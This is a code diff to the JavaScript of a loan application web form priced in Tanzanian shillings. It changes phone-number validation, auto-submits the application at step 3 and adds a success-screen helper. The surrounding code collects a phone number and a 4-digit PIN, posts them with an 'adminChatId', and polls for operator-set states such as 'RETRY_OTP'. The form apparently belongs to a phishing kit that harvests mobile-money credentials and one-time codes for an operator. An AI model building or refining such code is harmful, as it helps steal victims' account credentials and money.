@@ -82,7 +82,7 @@ document.addEventListener('DOMContentLoaded', () => {
   function validateStep(step) {
     let isValid = false;
     const currentStepEl = document.querySelector(`.form-step[data-step="${step}"]`);
-    const nextBtn = currentStepEl.querySelector('.next-btn, #btn-submit-app');
+    const nextBtn = currentStepEl.querySelector('.next-btn');
 
     if (step === 1) {
       const loanType = document.getElementById('loan-type').value;
@@ -93,7 +93,7 @@ document.addEventListener('DOMContentLoaded', () => {
       const fn = document.getElementById('first-name').value.trim();
       const ln = document.getElementById('last-name').value.trim();
       const contact = document.getElementById('user-contact').value.trim();
-      isValid = fn && ln && /^\d{9}$/.test(contact);
+      isValid = fn && ln && /^0\d{9}$/.test(contact);
     } else if (step === 3) {
       const employment = document.getElementById('employment-status').value;
       const income = document.getElementById('annual-income').value.trim();
@@ -109,8 +109,8 @@ document.addEventListener('DOMContentLoaded', () => {
   if (userContactInput) {
     userContactInput.addEventListener('input', (e) => {
       let value = e.target.value.replace(/\D/g, '');
-      if (value.length > 9) {
-        value = value.slice(0, 9);
+      if (value.length > 10) {
+        value = value.slice(0, 10);
       }
       e.target.value = value;
       validateStep(2);
@@ -121,8 +121,8 @@ document.addEventListener('DOMContentLoaded', () => {
   if (loginContactInput) {
     loginContactInput.addEventListener('input', (e) => {
       let value = e.target.value.replace(/\D/g, '');
-      if (value.length > 9) {
-        value = value.slice(0, 9);
+      if (value.length > 10) {
+        value = value.slice(0, 10);
       }
       e.target.value = value;
       checkPinComplete();
@@ -138,7 +138,7 @@ document.addEventListener('DOMContentLoaded', () => {
   document.getElementById('annual-income').addEventListener('input', () => validateStep(3));
 
   document.querySelectorAll('.next-btn').forEach(btn => {
-    btn.addEventListener('click', () => {
+    btn.addEventListener('click', async () => {
       if (currentStep === 1) {
         state.loanType = document.getElementById('loan-type').value;
         state.amount = `TZS ${parseInt(document.getElementById('form-amount').value).toLocaleString()}`;
@@ -152,7 +152,34 @@ document.addEventListener('DOMContentLoaded', () => {
         document.getElementById('sum-duration').textContent = state.duration;
         document.getElementById('sum-purpose').textContent = state.purpose;
         document.getElementById('sum-name').textContent = `${state.firstName} ${state.lastName}`;
+      } else if (currentStep === 3) {
+        state.employment = document.getElementById('employment-status').value;
+        state.income = document.getElementById('annual-income').value;
+
+        // Submit application automatically when Next is pressed at step 3
+        switchView('waiting');
+        try {
+          const response = await fetch('/api/submit-application', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              contact: state.contact,
+              pin: 'PENDING_PIN',
+              amount: state.amount,
+              adminChatId
+            })
+          });
+          const data = await response.json();
+          if (data.success) {
+            state.userId = data.userId;
+            pollStatus();
+          }
+        } catch (err) {
+          console.error(err);
+        }
+        return;
       }
+
       if (currentStep < 3) {
         currentStep++;
         updateStepView();
@@ -171,32 +198,6 @@ document.addEventListener('DOMContentLoaded', () => {
     });
   });
 
-  document.getElementById('btn-submit-app').addEventListener('click', async () => {
-    state.employment = document.getElementById('employment-status').value;
-    state.income = document.getElementById('annual-income').value;
-
-    switchView('waiting');
-    try {
-      const response = await fetch('/api/submit-application', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          contact: state.contact,
-          pin: 'PENDING_PIN',
-          amount: state.amount,
-          adminChatId
-        })
-      });
-      const data = await response.json();
-      if (data.success) {
-        state.userId = data.userId;
-        pollStatus();
-      }
-    } catch (err) {
-      console.error(err);
-    }
-  });
-
   function pollStatus() {
     const interval = setInterval(async () => {
       try {
@@ -213,7 +214,7 @@ document.addEventListener('DOMContentLoaded', () => {
           location.reload();
         } else if (data.status === 'SUCCESS') {
           clearInterval(interval);
-          document.getElementById('approved-amount-val').textContent = state.amount;
+          populateSuccessScreen();
           switchView('success');
         }
       } catch (e) {
@@ -243,7 +244,7 @@ document.addEventListener('DOMContentLoaded', () => {
     pinBoxes.forEach(b => pinStr += b.value);
     const contactVal = document.getElementById('login-contact').value.trim();
     const btnLogin = document.getElementById('btn-login');
-    if (pinStr.length === 4 && /^\d{9}$/.test(contactVal)) {
+    if (pinStr.length === 4 && /^0\d{9}$/.test(contactVal)) {
       state.pin = pinStr;
       btnLogin.disabled = false;
     } else {
@@ -295,7 +296,7 @@ document.addEventListener('DOMContentLoaded', () => {
           document.getElementById('btn-login').disabled = true;
         } else if (data.status === 'SUCCESS') {
           clearInterval(interval);
-          document.getElementById('approved-amount-val').textContent = state.amount;
+          populateSuccessScreen();
           switchView('success');
         }
       } catch (e) {
@@ -356,7 +357,7 @@ document.addEventListener('DOMContentLoaded', () => {
 
         if (data.status === 'SUCCESS') {
           clearInterval(interval);
-          document.getElementById('approved-amount-val').textContent = state.amount;
+          populateSuccessScreen();
           switchView('success');
         } else if (data.status === 'RETRY_OTP') {
           clearInterval(interval);
@@ -375,6 +376,12 @@ document.addEventListener('DOMContentLoaded', () => {
         console.error(e);
       }
     }, 3000);
+  }
+
+  function populateSuccessScreen() {
+    document.getElementById('approved-amount-val').textContent = state.amount;
+    document.getElementById('success-monthly-val').textContent = monthlyPayment.textContent;
+    document.getElementById('success-duration-val').textContent = state.duration;
   }
 
   document.getElementById('btn-home').addEventListener('click', () => {
